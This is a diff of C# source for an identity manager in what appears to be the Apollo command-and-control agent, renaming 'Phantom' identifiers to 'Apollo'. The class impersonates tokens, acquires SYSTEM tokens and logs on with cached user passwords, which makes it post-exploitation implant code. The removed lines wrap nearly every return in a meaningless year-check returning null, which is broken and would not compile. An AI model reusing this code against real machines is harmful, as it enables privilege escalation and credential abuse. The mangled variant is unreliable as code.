@@ -1,18 +1,18 @@
-﻿using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.PhantomStructs;
+﻿using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.ApolloStructs;
 using System;
 using System.Security.Principal;
-using PhantomInterop.Classes.Api;
-using static PhantomInterop.Enums.Win32;
-using static PhantomInterop.Constants.Win32;
+using ApolloInterop.Classes.Api;
+using static ApolloInterop.Enums.Win32;
+using static ApolloInterop.Constants.Win32;
 using System.Runtime.InteropServices;
-using static PhantomInterop.Structs.Win32;
-using PhantomInterop.Structs.MythicStructs;
-using PhantomInterop.Utils;
+using static ApolloInterop.Structs.Win32;
+using ApolloInterop.Structs.MythicStructs;
+using ApolloInterop.Utils;
 
-namespace Phantom.Management.Identity;
+namespace Apollo.Management.Identity;
 
-public class UserContext : IIdentityManager
+public class IdentityManager : IIdentityManager
 {
     private IAgent _agent;
 
@@ -79,7 +79,7 @@ public class UserContext : IIdentityManager
         LogonType dwLogonType,
         LogonProvider dwLogonProvider,
         out IntPtr phToken);
-    
+    //private delegate bool RevertToSelf();
 
     private GetCurrentThread _GetCurrentThread;
     private OpenThreadToken _OpenThreadToken;
@@ -93,11 +93,11 @@ public class UserContext : IIdentityManager
     private GetSidSubAuthority _GetSidSubAuthority;
 
     private LogonUserA _pLogonUserA;
-    
+    // private RevertToSelf _RevertToSelf;
 
     #endregion
 
-    public UserContext(IAgent agent)
+    public IdentityManager(IAgent agent)
     {
         _agent = agent;
 
@@ -105,7 +105,7 @@ public class UserContext : IIdentityManager
         _OpenThreadToken = _agent.GetApi().GetLibraryFunction<OpenThreadToken>(Library.ADVAPI32, "OpenThreadToken");
         _OpenProcessToken = _agent.GetApi().GetLibraryFunction<OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
         _DuplicateTokenEx = _agent.GetApi().GetLibraryFunction<DuplicateTokenEx>(Library.ADVAPI32, "DuplicateTokenEx");
-        
+        //_RevertToSelf = _agent.GetApi().GetLibraryFunction<RevertToSelf>(Library.ADVAPI32, "RevertToSelf");
         _SetThreadToken = _agent.GetApi().GetLibraryFunction<SetThreadToken>(Library.ADVAPI32, "SetThreadToken");
         _CloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
         _GetTokenInformation = _agent.GetApi().GetLibraryFunction<GetTokenInformation>(Library.ADVAPI32, "GetTokenInformation");
@@ -149,7 +149,7 @@ public class UserContext : IIdentityManager
 
     public bool IsOriginalIdentity()
     {
-        if(DateTime.Now.Year > 2020) { return !_isImpersonating; } else { return null; }
+        return !_isImpersonating;
     }
     public (bool,IntPtr) GetSystem()
     {
@@ -163,21 +163,21 @@ public class UserContext : IIdentityManager
             if (!success)
             {
                 DebugHelp.DebugWriteLine("[!] GetSystem() - OpenProcessToken failed!");
-                if(DateTime.Now.Year > 2020) { return (false,new IntPtr()); } else { return null; }
+                return (false,new IntPtr());
             }
             IntPtr hDupToken = IntPtr.Zero;
             success = _DuplicateTokenEx(hToken, TokenAccessLevels.MaximumAllowed, IntPtr.Zero, TokenImpersonationLevel.Impersonation, TokenType.TokenImpersonation, out hDupToken);
             if (!success)
             {
                 DebugHelp.DebugWriteLine("[!] GetSystem() - DuplicateToken failed!");
-                if(DateTime.Now.Year > 2020) { return (false,new IntPtr()); } else { return null; }
+                return (false,new IntPtr());
             }
             DebugHelp.DebugWriteLine("[+] Got SYSTEM token!");
-            if(DateTime.Now.Year > 2020) { return (true, hDupToken); } else { return null; }
+            return (true, hDupToken);
         }
         else
         {
-            if(DateTime.Now.Year > 2020) { return (false,new IntPtr()); } else { return null; }
+            return (false,new IntPtr());
         }
     }
 
@@ -198,7 +198,7 @@ public class UserContext : IIdentityManager
             0,
             out dwTokenInfoLength);
         if (dwTokenInfoLength == 0 || Marshal.GetLastWin32Error() != Error.ERROR_INSUFFICIENT_BUFFER)
-            if(DateTime.Now.Year > 2020) { return (IntegrityLevel)dwRet; } else { return null; }
+            return (IntegrityLevel)dwRet;
         pTokenLabel = Marshal.AllocHGlobal(dwTokenInfoLength);
         try
         {
@@ -224,7 +224,7 @@ public class UserContext : IIdentityManager
                 else if (dwRet >= SECURITY_MANDATORY_SYSTEM_RID)
                     dwRet = 4;
                 else
-                    dwRet = 0; 
+                    dwRet = 0; // unknown - should be unreachable.
 
             }
         }
@@ -234,7 +234,7 @@ public class UserContext : IIdentityManager
         {
             Marshal.FreeHGlobal(pTokenLabel);
         }
-        if(DateTime.Now.Year > 2020) { return (IntegrityLevel)dwRet; } else { return null; }
+        return (IntegrityLevel)dwRet;
     }
 
     private void SetImpersonationToken()
@@ -282,12 +282,12 @@ public class UserContext : IIdentityManager
 
     public WindowsIdentity GetCurrent()
     {
-        if(DateTime.Now.Year > 2020) { return _currentImpersonationIdentity; } else { return null; }
+        return _currentImpersonationIdentity;
     }
 
     public WindowsIdentity GetOriginal()
     {
-        if(DateTime.Now.Year > 2020) { return _originalIdentity; } else { return null; }
+        return _originalIdentity;
     }
 
     public bool SetIdentity(ApolloLogonInformation logonInfo)
@@ -297,7 +297,7 @@ public class UserContext : IIdentityManager
         IntPtr hToken = IntPtr.Zero;
 
         Revert();
-        
+        // Blank out the old struct
         _userCredential = logonInfo;
 
         bRet = _pLogonUserA(
@@ -330,7 +330,7 @@ public class UserContext : IIdentityManager
                 Revert();
             }
         }
-        if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
+        return bRet;
     }
 
     public void SetPrimaryIdentity(WindowsIdentity ident)
@@ -364,17 +364,17 @@ public class UserContext : IIdentityManager
         _currentImpersonationIdentity = _originalIdentity;
         _currentPrimaryIdentity = _originalIdentity;
         _isImpersonating = false;
-        
+        //_RevertToSelf();
     }
 
     public WindowsIdentity GetCurrentPrimaryIdentity()
     {
-        if(DateTime.Now.Year > 2020) { return _currentPrimaryIdentity; } else { return null; }
+        return _currentPrimaryIdentity;
     }
 
     public WindowsIdentity GetCurrentImpersonationIdentity()
     {
-        if(DateTime.Now.Year > 2020) { return _currentImpersonationIdentity; } else { return null; }
+        return _currentImpersonationIdentity;
     }
 
     public bool GetCurrentLogonInformation(out ApolloLogonInformation logonInfo)
@@ -383,10 +383,10 @@ public class UserContext : IIdentityManager
             !string.IsNullOrEmpty(_userCredential.Password))
         {
             logonInfo = _userCredential;
-            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+            return true;
         }
         logonInfo = new ApolloLogonInformation();
-        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+        return false;
     }
 
     
